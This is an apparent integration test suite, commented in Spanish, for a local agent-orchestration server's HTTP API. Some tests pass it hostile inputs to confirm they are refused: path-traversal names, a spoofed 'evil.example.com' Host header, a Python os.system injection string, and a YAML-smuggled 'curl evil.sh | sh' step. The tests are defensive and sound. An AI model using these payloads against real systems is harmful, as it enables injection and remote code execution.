"""Lo que el Studio suma en esta tanda, del lado del servidor.

Eran agujeros reales, no adornos:
  - se podia Guardar y no volver (el endpoint existia, el canvas no lo usaba);
  - un grafo con `{{marcadores}}` solo se podia correr por MCP o por codigo;
  - el `workspace` solo se ponia editando el JSON a mano, y sin el un nodo
    corre en el scratch de Hermes, que se BORRA al completar (SS4.1);
  - una corrida arrancada no se podia frenar sin matar el proceso.

Lo del lienzo (zoom, paneo, deshacer, resultado completo, gasto por nodo) se
verifica con Playwright, no aca: son eventos del navegador.

    uv run --python 3.11 --with jsonschema python ..\\tests\\test_ui_expansion.py
"""
import json, os, subprocess, sys, time, urllib.error, urllib.parse, urllib.request
from pathlib import Path

RAIZ = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(RAIZ / "hermes-agent"))
sys.path.insert(0, str(RAIZ / "dispatcher"))
import hermes_cli.kanban_db as k
import capacidades
import loop as dispatcher
sys.path.insert(0, str(RAIZ / "mcp_exporter"))
from exportar import parametros as mcp_par

PUERTO = 8798
TOKEN = "token-de-prueba-ui"
NOMBRE = "prueba-ui-expansion"
BOARD = f"ui-exp-{int(time.time()) % 100000}"

# El preflight de `validar` exige el binario instalado, asi que se compila con
# un runtime que EXISTA en esta maquina. En un contenedor sin CLIs no hay
# ninguno y esa parte se saltea diciendolo, en vez de fallar por el entorno.
disponibles = [rt for rt, d in capacidades.tabla().items()
               if d["disponible"] and d["lo_ejecuta"] == "orquester"]
RT = disponibles[0] if disponibles else None

env = {**os.environ, "ORQUESTER_TOKEN": TOKEN, "PYTHONIOENCODING": "utf-8"}
proc = subprocess.Popen([sys.executable, str(RAIZ / "ui" / "server.py"), str(PUERTO)],
                        env=env, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                        text=True, encoding="utf-8", errors="replace")


def pedir(ruta, cuerpo=None):
    req = urllib.request.Request(
        f"http://127.0.0.1:{PUERTO}{ruta}",
        data=json.dumps(cuerpo).encode() if cuerpo is not None else None,
        headers={"X-Orquester-Token": TOKEN} |
                ({"Content-Type": "application/json"} if cuerpo is not None else {}),
    )
    try:
        with urllib.request.urlopen(req, timeout=20) as r:
            return r.status, json.loads(r.read() or b"{}")
    except urllib.error.HTTPError as e:
        return e.code, json.loads(e.read() or b"{}")


GRAFO = {
    "board": NOMBRE,
    "nodos": [
        {"id": "a", "titulo": "Revisá {{repo}} y contá los tests",
         "runtime": RT or "hermes", "workspace": "{{repo}}"},
    ],
    "aristas": [],
}

try:
    for _ in range(50):
        try:
            pedir("/api/grafos")
            break
        except Exception:
            time.sleep(0.2)

    # --- 1. Guardar y volver a abrir ---
    codigo, _ = pedir("/api/grafo", GRAFO)
    assert codigo == 200, codigo
    codigo, datos = pedir("/api/grafos")
    assert NOMBRE in datos["grafos"], datos
    codigo, vuelto = pedir(f"/api/grafo?nombre={NOMBRE}")
    assert codigo == 200 and vuelto["nodos"] == GRAFO["nodos"], vuelto
    print("1. guardar -> listar -> abrir devuelve el MISMO grafo: OK")

    # --- 2. Los parametros salen del servidor, no de una regex del navegador ---
    codigo, datos = pedir("/api/parametros", GRAFO)
    assert datos["parametros"] == ["repo"], datos
    # El marcador esta en `titulo` Y en `workspace`: un parametro, no dos.
    print("2. /api/parametros detecta {{repo}} en titulo y workspace: OK")

    # --- 3. Compilar sin los valores no puede pasar de largo ---
    # Antes de esto no habia forma de mandarlos desde el canvas; si el grafo se
    # compilaba igual, el `{{repo}}` llegaba literal al disco como cwd.
    codigo, datos = pedir("/api/compilar", GRAFO)
    assert codigo == 400 and "repo" in datos["error"], (codigo, datos)
    print("3. compilar sin parametros: 400 nombrando el que falta: OK")

    if RT is None:
        print("4-5. compilacion salteada: no hay CLIs de agente en esta maquina")
    else:
        destino = str(RAIZ)                    # un directorio que existe de verdad
        codigo, datos = pedir("/api/compilar",
                              {**GRAFO, "board": BOARD, "valores": {"repo": destino}})
        assert codigo == 200, (codigo, datos)
        tid = datos["ids"]["a"]
        print(f"4. compilar con valores: OK (board {BOARD})")

        # --- 5. Lo sustituido y el workspace llegan a la card ---
        conn = k.connect(board=BOARD)
        t = k.get_task(conn, tid)
        assert "{{" not in t.title, f"quedo un marcador sin sustituir: {t.title!r}"
        assert destino in t.title, t.title
        assert t.workspace_kind == "dir" and t.workspace_path == destino, \
            f"el workspace no llego a la card: {t.workspace_kind} {t.workspace_path}"
        assert t.assignee == dispatcher.carril(RT), t.assignee
        conn.close()
        print("5. la card quedo con el titulo sustituido y el workspace puesto: OK")

    # --- 6. Parar un board donde no corre nada lo dice, no miente ---
    codigo, datos = pedir("/api/parar", {"board": BOARD})
    assert codigo == 200 and datos["ok"] is False and "no hay nada" in datos["motivo"], datos
    print("6. parar sin corrida: responde que no hay nada corriendo: OK")

    # --- 7. Los modelos salen del CLI, no de una lista escrita a mano ---
    # `claude-code` no tiene subcomando que liste: sus alias los documenta su
    # propio --help. Se prueba ese camino porque no lanza subproceso y no
    # depende de la red.
    codigo, datos = pedir("/api/modelos?runtime=claude-code")
    assert codigo == 200 and "sonnet" in datos["modelos"], datos
    assert "--help" in datos["fuente"], datos
    codigo, datos = pedir("/api/modelos?runtime=no-existe")
    assert datos["modelos"] == [] and "desconocido" in datos["fuente"], datos
    print("7. /api/modelos ofrece los modelos del runtime: OK")

    # --- 8. El nombre del grafo no puede salirse de ui/grafos ---
    # Explotado de verdad antes del arreglo: `board: "../../ESCAPE_TEST"`
    # escribio un .json en la raiz del repo, y el mismo truco leia cualquier
    # .json del disco. El nombre lo elige quien manda el pedido.
    for malo in ["../../ESCAPE_TEST", "..\..\ESCAPE_TEST", "sub/dir", "", ".", ".."]:
        codigo, datos = pedir("/api/grafo", {**GRAFO, "board": malo})
        assert codigo == 400, f"acepto guardar como {malo!r}: {codigo} {datos}"
        codigo, _ = pedir(f"/api/grafo?nombre={urllib.parse.quote(malo)}")
        assert codigo in (400, 404), f"acepto leer {malo!r}: {codigo}"
    assert not (RAIZ / "ESCAPE_TEST.json").exists(), "escribio fuera de ui/grafos"
    print("8. nombres con .. o / rechazados al guardar y al leer: OK")

    # --- 9. Plantillas: catalogo, copiar, no pisar, borrar ---
    codigo, datos = pedir("/api/plantillas")
    cat = {p["nombre"]: p for p in datos["plantillas"]}
    assert cat, "no hay plantillas en plantillas/"
    for nombre, pl in cat.items():
        assert pl["descripcion"], f"la plantilla {nombre} no dice para que sirve"
        assert pl["nodos"] >= 2, f"{nombre} tiene {pl['nodos']} nodo(s)"
        # `requiere` se deriva del grafo: tiene que coincidir con sus nodos.
        assert pl["runtimes"], nombre
    print(f"9. catalogo: {len(cat)} plantillas, todas con descripcion y runtimes: OK")

    # Una plantilla que no compila no sirve para nada. Se valida la ESTRUCTURA
    # (capacidades=False): que le falte un binario a esta maquina no invalida
    # la plantilla, pero un ciclo o una arista colgada si.
    sys.path.insert(0, str(RAIZ / "compiler"))
    import compile as compilador
    for f in sorted((RAIZ / "plantillas").glob("*.json")):
        g = json.loads(f.read_text(encoding="utf-8"))
        compilador.validar(g, capacidades=False)
        # Y los marcadores tienen que ser sustituibles: si el titulo pide
        # {{ruta}} y nadie lo declara, el grafo llega literal al disco.
        assert mcp_par(g), f"{f.stem} no tiene ningun parametro: no es reutilizable"
    print(f"9b. las {len(cat)} plantillas compilan y estan parametrizadas: OK")

    COPIA = "copia-de-prueba"
    codigo, datos = pedir("/api/plantilla", {"plantilla": "revision-de-repo", "nombre": COPIA})
    assert codigo == 200 and datos["grafo"]["board"] == COPIA, (codigo, datos)
    codigo, lista = pedir("/api/grafos")
    assert COPIA in lista["grafos"], lista
    # Usar una plantilla NO la modifica: es del repo, no del usuario.
    original = json.loads((RAIZ / "plantillas" / "revision-de-repo.json").read_text(encoding="utf-8"))
    assert original["board"] == "revision-de-repo", "la plantilla se modifico al usarla"
    print("10. usar una plantilla la copia sin tocar el original: OK")

    codigo, datos = pedir("/api/plantilla", {"plantilla": "revision-de-repo", "nombre": COPIA})
    assert codigo == 409, f"piso un grafo existente sin avisar: {codigo}"
    print("11. copiar sobre un nombre existente: 409, no lo pisa: OK")

    # El nombre de la plantilla tambien viene de afuera. 400 o 404 segun donde
    # se corte: desde que pasa por `_ruta_segura`, un nombre con `..` se rechaza
    # por INVALIDO (400) antes de mirar el disco, y solo un nombre bien formado
    # que no existe llega al 404. Lo que importa es que ninguno entre.
    for malo in ["../../ui/grafos/prueba-ui-expansion", "..", "no-existe"]:
        codigo, _ = pedir("/api/plantilla", {"plantilla": malo, "nombre": "x"})
        assert codigo in (400, 404), f"acepto la plantilla {malo!r}: {codigo}"
    print("12. nombres de plantilla con .. o inexistentes: rechazados: OK")

    codigo, _ = pedir("/api/grafo/borrar", {"board": COPIA})
    assert codigo == 200, codigo
    codigo, lista = pedir("/api/grafos")
    assert COPIA not in lista["grafos"], lista
    codigo, _ = pedir("/api/grafo/borrar", {"board": COPIA})
    assert codigo == 404, "borrar algo que no existe deberia ser 404"
    print("13. borrar un grafo propio: OK")

    # --- 14. Acomodar el grafo y detectar los parametros sin valor ---
    codigo, datos = pedir("/api/ordenar", GRAFO)
    assert codigo == 200 and set(datos["posiciones"]) == {"a"}, datos
    codigo, datos = pedir("/api/ordenar", {"nodos": [], "aristas": []})
    assert codigo == 400, "acomodar un grafo invalido deberia fallar antes"
    print("14. /api/ordenar devuelve coordenadas y rechaza grafos invalidos: OK")

    codigo, datos = pedir("/api/parametros", GRAFO)
    assert datos["faltan"] == ["repo"], datos
    codigo, datos = pedir("/api/parametros", {**GRAFO, "valores": {"repo": "  "}})
    assert datos["faltan"] == ["repo"], f"un valor en blanco cuenta como puesto: {datos}"
    codigo, datos = pedir("/api/parametros", {**GRAFO, "valores": {"repo": "cualquier-cosa"}})
    assert datos["faltan"] == [], datos
    print("15. los parametros sin valor se listan aparte (y en blanco no cuenta): OK")

    # --- 16. El chat rechaza lo que no puede atender, sin gastar un turno ---
    codigo, datos = pedir("/api/chat", {"runtime": "hermes", "mensaje": "hola"})
    assert codigo == 400 and "no puede chatear" in datos["error"], datos
    codigo, datos = pedir("/api/chat", {"runtime": "claude-code", "mensaje": "   "})
    assert codigo == 400 and "vacio" in datos["error"], datos
    print("16. el chat rechaza runtime invalido y mensaje vacio: OK")

    # El chat acepta modelo y esfuerzo, y valida el esfuerzo contra SU lista.
    codigo, datos = pedir("/api/chat", {"runtime": "antigravity", "mensaje": "hola",
                                        "esfuerzo": "max"})
    assert codigo == 400 and "no acepta esfuerzo 'max'" in datos["error"], datos
    print("16b. el chat valida el esfuerzo con la lista del ejecutor: OK")

    # --- 17. El tope que se informa es el que se APLICO ---
    # Editar el campo con la corrida en marcha no cambia el techo de esa
    # corrida: la barra mostraba un tope que nadie estaba respetando.
    codigo, datos = pedir(f"/api/consumo?board={BOARD}")
    assert datos["tope_usd"] is None, f"informa un tope sin haber arrancado: {datos}"
    codigo, datos = pedir("/api/correr", {"board": BOARD, "presupuesto_usd": "0.5"})
    assert codigo == 200, datos
    codigo, datos = pedir(f"/api/consumo?board={BOARD}")
    assert datos["tope_usd"] == 0.5, f"no recuerda el tope de la corrida: {datos}"
    codigo, datos = pedir("/api/correr", {"board": BOARD, "presupuesto_usd": "-1"})
    assert codigo == 400, "acepto un presupuesto negativo"
    codigo, datos = pedir(f"/api/consumo?board={BOARD}")
    assert datos["tope_usd"] == 0.5, "un arranque rechazado piso el tope vigente"
    print("17. el consumo informa el tope con el que se arranco: OK")

    # --- 18. El grafo guardado conserva sus marcadores ---
    # Se guarda el grafo, no la corrida: si al guardar se sustituyera, el grafo
    # dejaria de ser reutilizable con otros datos.
    codigo, vuelto = pedir(f"/api/grafo?nombre={NOMBRE}")
    assert "{{repo}}" in vuelto["nodos"][0]["titulo"], vuelto
    print("18. el grafo guardado sigue parametrizado: OK")

    # --- 19. /api/boards lista los boards existentes de kanban_db ---
    codigo, datos_boards = pedir("/api/boards")
    assert codigo == 200 and "boards" in datos_boards, datos_boards
    assert isinstance(datos_boards["boards"], list) and len(datos_boards["boards"]) > 0, datos_boards
    print("19. /api/boards lista los boards existentes: OK")

    # --- 20. /api/exportar-mermaid genera diagrama Mermaid valido ---
    grafo_mermaid = {
        "board": "prueba-mermaid",
        "nodos": [{"id": "a", "titulo": "Nodo A", "runtime": "claude-code"},
                  {"id": "b", "titulo": "Nodo B", "runtime": "hermes"}],
        "aristas": [["a", "b"]],
    }
    codigo, datos_mmd = pedir("/api/exportar-mermaid", grafo_mermaid)
    assert codigo == 200 and "mermaid" in datos_mmd, datos_mmd
    assert "graph TD" in datos_mmd["mermaid"] and "a --> b" in datos_mmd["mermaid"], datos_mmd
    print("20. /api/exportar-mermaid genera diagrama Mermaid: OK")

    # --- 21. /api/optimizar-goal mejora el prompt preservando marcadores ---
    codigo, datos_opt = pedir("/api/optimizar-goal", {
        "goal": "Revisá el código de {{repo}} y reportá bugs",
        "runtime": "claude-code",
        "reglas": "Respondé en español.",
        "dry_run": True
    })
    assert codigo == 200 and "optimizado" in datos_opt, datos_opt
    assert "{{repo}}" in datos_opt["optimizado"], datos_opt
    print("21. /api/optimizar-goal responde y preserva {{marcadores}}: OK")

    # --- 22. /api/telemetria devuelve métricas estructuradas del board ---
    codigo, datos_tele = pedir(f"/api/telemetria?board={BOARD}")
    assert codigo == 200 and "resumen" in datos_tele and "consumo" in datos_tele, datos_tele
    assert "progreso_pct" in datos_tele["resumen"] and "nodos" in datos_tele, datos_tele
    print("22. /api/telemetria devuelve métricas en tiempo real: OK")

    # --- 23. /api/historial consolida corridas previas ---
    codigo, datos_hist = pedir("/api/historial")
    assert codigo == 200 and "historial" in datos_hist, datos_hist
    assert isinstance(datos_hist["historial"], list), datos_hist
    print("23. /api/historial lista estados de ejecuciones previas: OK")

    # --- 24. /api/generar-grafo produce un DAG estructurado y ordenado ---
    codigo, datos_gen = pedir("/api/generar-grafo", {
        "descripcion": "Auditar seguridad y correr tests en paralelo con reporte final",
        "runtime": "claude-code",
        "dry_run": True
    })
    assert codigo == 200 and "grafo" in datos_gen, datos_gen
    assert len(datos_gen["grafo"]["nodos"]) >= 2, datos_gen
    assert len(datos_gen["grafo"]["aristas"]) >= 1, datos_gen
    # `degradado` viaja AL LADO del grafo, no adentro: metido adentro viajaba al
    # .json guardado y de ahi al compilador.
    assert datos_gen["degradado"] is True and "dry_run" in datos_gen["motivo"], datos_gen
    assert "_degradado" not in datos_gen["grafo"], datos_gen["grafo"]
    print("24. /api/generar-grafo genera DAG validado y ordenado: OK")

    # --- 24b. Refinar sin agente NO pisa el grafo ---
    # Es la diferencia que importa: crear sin agente da una plantilla, pero
    # refinar sin agente tiene que devolver el grafo tal cual estaba. Pisarlo
    # seria perder el trabajo del usuario por no poder hablar con nadie.
    mio = {"board": "refina-test", "aristas": [],
           "nodos": [{"id": "unico", "titulo": "lo mio", "runtime": "hermes",
                      "x": 77, "y": 99}]}
    codigo, datos_ref = pedir("/api/generar-grafo", {
        "descripcion": "agregale un nodo de tests",
        "actual": mio, "dry_run": True,
    })
    assert codigo == 200, datos_ref
    assert datos_ref["degradado"] is True and "sin cambios" in datos_ref["motivo"], datos_ref
    assert datos_ref["grafo"]["nodos"] == mio["nodos"], datos_ref["grafo"]
    print("24b. refinar sin agente devuelve el grafo intacto: OK")

    # --- 25. /api/reintentar-nodo desbloquea una card fallida ---
    conn = k.connect(board=BOARD)
    tasks = k.list_tasks(conn)
    if tasks:
        tid = tasks[0].id
        codigo, datos_reintento = pedir("/api/reintentar-nodo", {
            "board": BOARD,
            "task_id": tid
        })
        assert codigo == 200 and datos_reintento.get("ok"), datos_reintento
        print("25. /api/reintentar-nodo desbloquea card sin error: OK")
    conn.close()

    # --- 26. /api/doctor devuelve diagnóstico integral ---
    codigo, datos_doc = pedir("/api/doctor")
    assert codigo == 200 and "plataforma" in datos_doc and "binarios" in datos_doc, datos_doc
    assert "sqlite_version" in datos_doc["plataforma"], datos_doc
    print("26. /api/doctor diagnostica entorno y runtimes: OK")

    # --- 27. /api/exportar-ci genera workflow de GitHub Actions ---
    codigo, datos_ci = pedir("/api/exportar-ci", {
        "board": "pipeline-ci",
        "nodos": [
            {"id": "test", "titulo": "Ejecutar suite de tests", "runtime": "claude-code"},
            {"id": "deploy", "titulo": "Desplegar a produccion", "runtime": "opencode"}
        ],
        "aristas": [["test", "deploy"]]
    })
    assert codigo == 200 and "workflow" in datos_ci, datos_ci
    assert "needs: [test]" in datos_ci["workflow"], datos_ci["workflow"]
    print("27. /api/exportar-ci genera pipeline CI/CD con dependencias: OK")

    # --- 28. /api/snapshot guarda un punto de control del diseño ---
    codigo, datos_snap = pedir("/api/snapshot", {
        "board": "mi-board-snap",
        "descripcion": "Snapshot de prueba",
        "grafo": {"board": "mi-board-snap", "nodos": [{"id": "a", "titulo": "t1"}], "aristas": []}
    })
    assert codigo == 200 and datos_snap.get("ok") and "id" in datos_snap, datos_snap
    snap_id = datos_snap["id"]
    print("28. /api/snapshot guarda punto de restauracion: OK")

    # --- 29. /api/snapshots lista puntos de restauracion ---
    codigo, datos_lista_snap = pedir("/api/snapshots?board=mi-board-snap")
    assert codigo == 200 and "snapshots" in datos_lista_snap, datos_lista_snap
    assert any(s["id"] == snap_id for s in datos_lista_snap["snapshots"]), datos_lista_snap
    print("29. /api/snapshots lista instantaneas registradas: OK")

    # --- 30. /api/snapshot/restaurar recupera el grafo exacto ---
    codigo, datos_rest = pedir("/api/snapshot/restaurar", {"id": snap_id})
    assert codigo == 200 and datos_rest.get("ok"), datos_rest
    assert datos_rest["snapshot"]["grafo"]["board"] == "mi-board-snap", datos_rest
    print("30. /api/snapshot/restaurar recupera diseño inmutable: OK")

    # --- 31. /api/exportar-python genera script Python ejecutable ---
    codigo, datos_py = pedir("/api/exportar-python", {
        "board": "mi-flujo-auto",
        "nodos": [{"id": "a", "titulo": "Tarea A", "runtime": "claude-code"}],
        "aristas": []
    })
    assert codigo == 200 and "script" in datos_py, datos_py
    assert "dispatcher.correr" in datos_py["script"] and "compilador.validar" in datos_py["script"], datos_py
    print("31. /api/exportar-python genera script Python autónomo: OK")

    # --- 32. /api/simular calcula camino crítico y paralelismo por capas ---
    codigo, datos_sim = pedir("/api/simular", {
        "board": "rombo-sim",
        "nodos": [
            {"id": "a", "titulo": "Inicio", "runtime": "hermes"},
            {"id": "b", "titulo": "Rama 1", "runtime": "opencode"},
            {"id": "c", "titulo": "Rama 2", "runtime": "claude-code"},
            {"id": "d", "titulo": "Fin", "runtime": "antigravity"}
        ],
        "aristas": [["a", "b"], ["a", "c"], ["b", "d"], ["c", "d"]]
    })
    assert codigo == 200 and datos_sim.get("ok"), datos_sim
    assert datos_sim["camino_critico_pasos"] == 3, datos_sim
    assert datos_sim["paralelismo_maximo"] == 2, datos_sim
    assert len(datos_sim["pasos"]) == 3, datos_sim
    assert len(datos_sim["runtimes"]) == 4, datos_sim
    print("32. /api/simular analiza topología, camino crítico y paralelismo: OK")

    # --- 33. /api/secretos-status inspecciona credenciales de forma segura ---
    codigo, datos_sec = pedir("/api/secretos-status")
    assert codigo == 200 and "secretos" in datos_sec, datos_sec
    assert any(s["variable"] == "ANTHROPIC_API_KEY" for s in datos_sec["secretos"]), datos_sec
    print("33. /api/secretos-status verifica presencia segura de API keys: OK")

    # --- 34. /api/reporte-corrida genera informe Markdown estructurado ---
    # Contra el board que ESTE test creo, no contra `ui-exp-2213` hardcodeado.
    # Ese era el board de una corrida vieja: el test pasaba solo en una maquina
    # donde alguien ya lo habia corrido, e informaba sobre datos ajenos.
    codigo, datos_rep = pedir(f"/api/reporte-corrida?board={BOARD}")
    assert codigo == 200 and "reporte" in datos_rep, datos_rep
    assert "# Reporte de Auditoría:" in datos_rep["reporte"], datos_rep["reporte"]
    assert "Resumen Ejecutivo" in datos_rep["reporte"], datos_rep["reporte"]
    print("34. /api/reporte-corrida compila reporte de auditoría Markdown: OK")

    # --- 35. Un snapshot no puede escribir fuera de ui/grafos/snapshots ---
    # Explotado de verdad antes del arreglo: `board` solo se filtraba contra
    # `..`, y una ruta ABSOLUTA no tiene `..`. Se verifica el 400 Y que no haya
    # quedado nada en disco: un 400 por otro motivo daria falso verde.
    fuera = RAIZ / "SNAPSHOT_ESCAPE.json"
    # Sin `""`: el endpoint lo cambia por "orquester" antes de validar, asi que
    # un board vacio es un board por defecto, no un nombre invalido.
    for malo in [str(fuera.with_suffix("")), "../../SNAPSHOT_ESCAPE", "sub/x", ".", ".."]:
        codigo, datos = pedir("/api/snapshot", {"board": malo, "grafo": GRAFO})
        assert codigo == 400, f"acepto el snapshot {malo!r}: {codigo} {datos}"
    assert not fuera.exists(), "el snapshot escribio fuera de snapshots/"
    codigo, _ = pedir("/api/snapshot/restaurar", {"id": str(fuera.with_suffix(""))})
    assert codigo == 400, "restaurar acepto una ruta absoluta"
    print("35. snapshots: rutas absolutas y .. rechazadas, nada escrito fuera: OK")

    # --- 36. Un pedido malformado responde 400, no cierra el socket ---
    # `Content-Length` y `json.loads` estaban FUERA del try de `do_POST`: un
    # cuerpo que no fuera JSON tiraba la excepcion en el handler y el cliente
    # se quedaba sin respuesta (curl exit 52). Hace falta socket crudo: urllib
    # no deja mandar un Content-Length invalido ni un Host arbitrario.
    import http.client

    def crudo(cuerpo=b"", host=None, largo=None):
        c = http.client.HTTPConnection("127.0.0.1", PUERTO, timeout=10)
        c.putrequest("POST", "/api/validar", skip_host=bool(host))
        if host:
            c.putheader("Host", host)
        c.putheader("X-Orquester-Token", TOKEN)
        c.putheader("Content-Type", "application/json")
        c.putheader("Content-Length", largo if largo is not None else str(len(cuerpo)))
        c.endheaders()
        c.send(cuerpo)
        r = c.getresponse()
        salida = (r.status, r.read())
        c.close()
        return salida

    assert crudo(b"no-es-json")[0] == 400, "un cuerpo no-JSON no respondio 400"
    assert crudo(b"[1,2,3]")[0] == 400, "acepto un cuerpo que no es un objeto"
    assert crudo(b"{}", largo="abc")[0] == 400, "un Content-Length invalido no respondio 400"
    # Negativo aparte: `read(-1)` lee HASTA EOF, o sea que colgaba el hilo
    # esperando un cierre que el cliente no tiene por que hacer.
    assert crudo(b"{}", largo="-1")[0] == 400, "un Content-Length negativo no respondio 400"
    print("36. cuerpo malformado y Content-Length invalido o negativo: 400: OK")

    # --- 36b. Dos snapshots del mismo board en el mismo segundo no se pisan ---
    # Un snapshot es inmutable; el id era `{board}_{segundos}` y el segundo
    # sobreescribia al primero.
    ids_snap = {pedir("/api/snapshot", {"board": "mi-board-snap", "grafo": GRAFO,
                                        "descripcion": f"rafaga {i}"})[1]["id"]
                for i in range(3)}
    assert len(ids_snap) == 3, f"dos snapshots compartieron id: {ids_snap}"
    print("36b. snapshots simultaneos del mismo board no se pisan: OK")

    # --- 37. El query string se decodifica ---
    # `params` se armaba con un `split("=")` a mano: un grafo llamado `mi flujo`
    # (nombre que `_archivo` acepta) llegaba como `mi%20flujo` y era inabrible.
    CON_ESPACIO = "prueba con espacio"
    codigo, _ = pedir("/api/grafo", {**GRAFO, "board": CON_ESPACIO})
    assert codigo == 200, "no dejo guardar un nombre con espacios"
    codigo, datos = pedir(f"/api/grafo?nombre={urllib.parse.quote(CON_ESPACIO)}")
    assert codigo == 200 and datos["board"] == CON_ESPACIO, (codigo, datos)
    pedir("/api/grafo/borrar", {"board": CON_ESPACIO})
    print("37. un nombre con espacios se guarda y se lee URL-encodeado: OK")

    # --- 38. Un `Host` ajeno no se atiende (DNS rebinding) ---
    # Sin esto, una pagina cualquiera hace que su dominio resuelva a 127.0.0.1 y
    # le habla al Studio como same-origin. `/api/capacidades` va sin token y
    # publica la ruta en disco de cada binario instalado.
    assert crudo(b"{}", host="evil.example.com")[0] == 421, "atendio un Host ajeno"
    assert crudo(b"{}", host=f"127.0.0.1:{PUERTO}")[0] != 421, "rechazo el Host propio"
    print("38. un Host que no es esta maquina: 421: OK")

    # --- 39. El script exportado no es un vector de ejecucion ---
    # El grafo se interpolaba en el FUENTE: `true`/`null` de JSON no son
    # literales de Python (NameError), y un board con comillas cerraba el
    # literal. El script se descarga y se corre a mano.
    HOSTIL = 'x" ; import os; os.system("echo pwn") #'
    g_raro = {"board": HOSTIL, "aristas": [],
              "nodos": [{"id": "a", "titulo": 'con """ y \\ adentro',
                         "runtime": "opencode", "fijo": True, "nada": None}]}
    codigo, datos = pedir("/api/exportar-python", g_raro)
    assert codigo == 200, datos
    script = datos["script"]
    compile(script, "<exportado>", "exec")          # SyntaxError si se rompio
    assert "os.system" not in script.replace(json.dumps(HOSTIL), ""), \
        "el board se interpolo en el fuente del script"
    ns = {}
    exec(compile(script.split("def main()")[0].replace("Path(__file__)", 'Path(".")'),
                 "<exportado>", "exec"), ns)
    assert ns["GRAFO"] == g_raro, "el grafo no sobrevivio el viaje (bool/null/comillas)"
    print("39. script exportado: compila, sin inyeccion y con el grafo intacto: OK")

    # --- 40. El workflow de CI tampoco ---
    # `nid` se saneaba para la clave del job y tres lineas mas abajo se usaba el
    # id CRUDO en `name:`, en el `echo` y en el `python -c`.
    import yaml
    g_ci = {"board": "ci\nx", "aristas": [["a.b", "otro"]], "nodos": [
        {"id": 'a"\n      - run: curl evil.sh | sh\n    x: "', "titulo": "t\ncon salto",
         "runtime": "claude-code"},
        # Dos ids distintos que colapsan al mismo slug: sin desempate quedaban
        # dos claves YAML iguales y un job desaparecia.
        {"id": "a.b", "titulo": "primero", "runtime": "opencode"},
        {"id": "a-b", "titulo": "segundo", "runtime": "opencode"},
        {"id": "otro", "titulo": "hijo", "runtime": "opencode"},
    ]}
    codigo, datos = pedir("/api/exportar-ci", g_ci)
    assert codigo == 200, datos
    wf = yaml.safe_load(datos["workflow"])          # ParserError si se inyecto
    assert len(wf["jobs"]) == 4, f"se perdio un job por colision de slug: {list(wf['jobs'])}"
    assert "curl evil.sh" not in json.dumps(wf["jobs"]), "se inyecto un paso en el workflow"
    print("40. workflow CI: YAML valido, sin inyeccion y sin jobs perdidos: OK")

    # --- 41. /api/analizar-grafo detecta antipatrones, aristas redundantes y nodos aislados ---
    codigo, datos_lint = pedir("/api/analizar-grafo", {
        "board": "test-lint",
        "nodos": [
            {"id": "a", "titulo": "A", "runtime": "claude-code"},
            {"id": "b", "titulo": "B", "runtime": "opencode"},
            {"id": "c", "titulo": "C", "runtime": "hermes"},
            {"id": "aislado", "titulo": "Aislado", "runtime": "antigravity"},
            {"id": "pesado", "titulo": "Pesado", "runtime": "claude-code", "esfuerzo": "max"}
        ],
        "aristas": [["a", "b"], ["b", "c"], ["a", "c"], ["a", "pesado"]]
    })
    assert codigo == 200 and datos_lint.get("ok"), datos_lint
    codigos_hallazgos = {h["codigo"] for h in datos_lint["hallazgos"]}
    assert "nodo_aislado" in codigos_hallazgos, datos_lint
    assert "arista_redundante" in codigos_hallazgos, datos_lint
    assert "esfuerzo_sin_tope" in codigos_hallazgos, datos_lint
    print("41. /api/analizar-grafo detecta nodos aislados, aristas redundantes y riesgos: OK")

    # --- 42. /api/trazabilidad-grafo computa upstreams, downstreams e impacto relativo ---
    grafo_rombo = {
        "board": "rombo-trace",
        "nodos": [
            {"id": "a", "titulo": "Inicio", "runtime": "hermes"},
            {"id": "b", "titulo": "Rama B", "runtime": "opencode"},
            {"id": "c", "titulo": "Rama C", "runtime": "claude-code"},
            {"id": "d", "titulo": "Fin", "runtime": "antigravity"}
        ],
        "aristas": [["a", "b"], ["a", "c"], ["b", "d"], ["c", "d"]]
    }
    codigo, trace_b = pedir("/api/trazabilidad-grafo", {"nodo": "b", "grafo": grafo_rombo})
    assert codigo == 200 and trace_b.get("ok"), trace_b
    assert trace_b["ancestros"] == ["a"], trace_b
    assert trace_b["descendientes"] == ["d"], trace_b
    assert trace_b["total_impactados"] == 1, trace_b

    codigo, trace_a = pedir("/api/trazabilidad-grafo", {"nodo": "a", "grafo": grafo_rombo})
    assert codigo == 200 and trace_a.get("ok"), trace_a
    assert trace_a["ancestros"] == [], trace_a
    assert trace_a["descendientes"] == ["b", "c", "d"], trace_a
    assert trace_a["impacto_pct"] == 100.0, trace_a
    print("42. /api/trazabilidad-grafo computa upstreams, downstreams e impacto de bloqueo: OK")

    # --- 43. /api/snapshot/diff compara diferencias estructurales entre grafos ---
    grafo_modificado = {
        "board": "mi-board-snap",
        "nodos": [
            {"id": "a", "titulo": "A Modificado", "runtime": "opencode"},
            {"id": "c", "titulo": "C Nuevo", "runtime": "claude-code"}
        ],
        "aristas": [["a", "c"]]
    }
    codigo, datos_diff = pedir("/api/snapshot/diff", {
        "id": snap_id,
        "grafo_actual": grafo_modificado
    })
    assert codigo == 200 and datos_diff.get("ok"), datos_diff
    assert "c" in datos_diff["nodos_agregados"], datos_diff
    assert any(m["id"] == "a" for m in datos_diff["nodos_modificados"]), datos_diff
    assert not datos_diff["identicos"], datos_diff
    print("43. /api/snapshot/diff detecta adiciones, eliminaciones y cambios estructurales: OK")
finally:
    proc.terminate()
    proc.wait(timeout=10)
    (RAIZ / "ui" / "grafos" / f"{NOMBRE}.json").unlink(missing_ok=True)
    # Los snapshots de los tests 28 y 35 tambien: cada corrida dejaba uno y
    # `/api/snapshots` los va acumulando. Se borra por el board que usan, no por
    # id, para que valga aunque el test corte antes de leer el id.
    for viejo in (RAIZ / "ui" / "grafos" / "snapshots").glob("mi-board-snap_*.json"):
        viejo.unlink(missing_ok=True)
    # El board tambien: cada corrida creaba uno y nadie lo borraba. Habia 60
    # `ui-exp-*` acumulados en el kanban del usuario, y uno de ellos era el que
    # hacia pasar el test 34 por accidente.
    # En Windows el handle de SQLite no se suelta en el instante del terminate(),
    # asi que se reintenta un rato corto. Y si igual no sale, se DICE: un
    # `ignore_errors` a secas deja el mismo basural de antes, en silencio.
    import shutil
    for _ in range(20):
        shutil.rmtree(k.board_dir(BOARD), ignore_errors=True)
        if not k.board_dir(BOARD).exists():
            break
